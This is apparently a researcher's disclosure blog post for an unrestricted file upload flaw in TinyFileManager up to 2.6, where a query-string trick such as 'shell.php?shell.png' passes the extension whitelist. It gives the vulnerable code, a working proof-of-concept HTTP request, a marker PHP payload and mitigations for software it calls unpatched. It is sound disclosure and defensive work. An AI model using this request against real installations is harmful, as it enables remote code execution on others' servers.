---
title: "CVE-2026-116044"
date: 2026-10-24
permalink: /research/CVE-2026-116044/
tags:
  - cool posts
  - category1
  - category2
---

# CVE-2026-116044 – Extension Whitelist Bypass in TinyFileManager via Remote URL Upload

## Overview

In this writeup I describe **CVE-2026-116044**, an **Unrestricted File Upload** vulnerability (CWE-434) that I've discovered in **TinyFileManager** up to and including version **2.6**.

The flaw is located in the remote URL upload module of `tinyfilemanager.php`. Due to an error in the order of operations, extension validation is performed on a “dirty” filename that still includes the query string, while the file is later saved with a “clean” filename. This allows an attacker to bypass the extension whitelist and upload potentially dangerous files, with possible code execution on the server.

Although the reported CVSS score varies between **5.3** and **6.3**, the real-world impact is critical for instances exposed to the Internet.

## Details

- **Product**: prasathmani TinyFileManager
- **Affected versions**: `<= 2.6`
- **Component**: `tinyfilemanager.php` – *Remote URL File Upload* module
- **Type**: Unrestricted Upload of File with Dangerous Type
- **CWE**: CWE-434
- **Attack surface**: remote
- **Official patch**: no patch available; the vendor did not respond to the report

## Summary

The vulnerability arises because:

1. the filename is extracted including the query string;
2. the extension whitelist is validated against this “dirty” filename;
3. only at `rename()` time is the query string removed via `strtok()`;
4. the file is therefore saved with a different extension than the one that was validated.

Example:

- Remote URL: `https://attacker.example/shell.php?shell.png`
- Filename used for validation: `shell.php?shell.png`
- Validated extension: `png`
- Final saved filename: `shell.php`

## Test Configuration

To reproduce the vulnerability in a lab, the extension whitelist must be configured, for example, as follows:

```php
// Allowed file extensions for upload files
// e.g. 'gif,png,jpg,html,txt'
$allowed_upload_extensions = 'jpg,png,gif';
```

## Technical Analysis

The vulnerable code is as follows:

```php
function get_file_path(){
    global $path, $fileinfo, $temp_file;
    return $path . "/" . basename($fileinfo->name);
}

// Extract the "dirty" filename
$fileinfo->name = trim(urldecode(basename($url)), ".\x00..\x20");

// Validate extension on the dirty filename (VULNERABLE)
$allowed = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
$ext = strtolower(pathinfo($fileinfo->name, PATHINFO_EXTENSION));
$isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;

if (!$isFileAllowed) {
    $err = array("message" => "File extension is not allowed");
    event_callback(array("fail" => $err));
    exit();
}

// Save after removing query string (late sanitization – VULNERABLE)
$success = rename($temp_file, strtok(get_file_path(), '?'));
```

### 1. Extraction of the “dirty” filename

```php
$fileinfo->name = trim(urldecode(basename($url)), ".\x00..\x20");
```

The `basename()` function does not remove the query string. Therefore, given the URL:

```text
https://attacker.example/shell.php?shell.png
```

the extracted value is:

```text
shell.php?shell.png
```

`urldecode()` decodes any percent-encoded characters, while `trim()` only removes specific characters at the edges. The query string therefore remains part of the filename used for validation.

### 2. Extension validation

```php
$allowed = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
$ext = strtolower(pathinfo($fileinfo->name, PATHINFO_EXTENSION));
$isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;
```

Because `pathinfo()` is executed on the “dirty” filename, the detected extension is the one present in the query string:

```text
shell.php?shell.png
```

In this case, `pathinfo(..., PATHINFO_EXTENSION)` returns `png`. If `png` is present in the whitelist, as in our case, the check passes and the flow continues.

### 3. Saving the file

```php
$success = rename($temp_file, strtok(get_file_path(), '?'));
```

Only at this stage does `strtok(..., '?')` remove the query string. The file is therefore saved with the filename:

```text
shell.php
```

Sanitization happens too late: validation has already been performed against a filename that does not correspond to the final one.

### 4. Execution

If the file is saved in a web-accessible directory and the server interprets the content as PHP, the attacker can request the uploaded file and achieve code execution on the server.

## Proof of Concept

> **Disclaimer**: the following PoC is provided exclusively for educational and security research purposes. Do not use it against systems without explicit authorization.

The essential HTTP request for remote URL upload is as follows:

```http
POST /index.php?p=&upload HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Cookie: filemanager=<session_cookie>
X-Requested-With: XMLHttpRequest

type=upload
&uploadurl=https://<attacker_server>/shell.php?shell.png
&token=<token>
&ajax=true
```

The remote file can be a demonstrative payload that allows execution on the server to be verified. In a controlled test, a payload that returns a marker is sufficient:

```php
<?php echo "CVE-2026-116044-POC"; ?>
```

The request tricks the extension check into believing the file is a `.png` image, while the file actually saved will be `shell.php`.

After upload, execution can be verified by requesting the saved file:

```http
http://<target>/<path>/shell.php
```

In a real environment, a PHP file uploaded with malicious content can lead to command execution on the server.

## Video Proof of Concept

Below is the video demonstration of the working PoC:

<div style="position:relative; width:100%; max-width:640px; aspect-ratio:16/9; margin:20px 0;">
  <iframe
    src="https://streamable.com/e/nfxv74?muted=1"
    title="Report video"
    allow="fullscreen"
    allowfullscreen
    webkitallowfullscreen
    mozallowfullscreen
    loading="lazy"
    style="position:absolute; inset:0; width:100%; height:100%; border:0;">
  </iframe>
</div>

## Impact

The vulnerability allows an attacker to bypass the extension whitelist in the remote URL upload module. If the upload directory is web-accessible and the server executes PHP files, an attacker can upload and execute arbitrary code.

The impact is therefore potentially critical for installations exposed to the Internet, even though the CVSS score is classified as “medium”.

## Mitigation

Since no official patch is available, the recommended mitigations are:

- restrict access to TinyFileManager through strong authentication and network restrictions;
- do not expose the file manager directly to the Internet;
- disable remote URL upload if it is not required;
- prevent script execution in upload directories;
- validate the final filename, not the “dirty” filename;
- normalize and sanitize the URL before validation;
- enforce a strict whitelist and inspect the actual content of uploaded files.

## Timeline

| Date | Event |
|---|---|
| September 22, 2026 | Advisory disclosed; VulDB entry created |
| October 24, 2026 | Vulnerability accepted by VulDB |
| October 24, 2026 | Publication on NVD and CVE.org |

The vendor was contacted in advance but did not respond.

## References

- [NVD – CVE-2026-116044](https://nvd.nist.gov/vuln/detail/cve-2026-116044)
- [VulDB – CVE-2026-116044](https://vuldb.com/it/cve/CVE-2026-116044)
- [FixTheCVE – Mitigation Guide](https://fixthecve.com/cve/CVE-2026-116044)
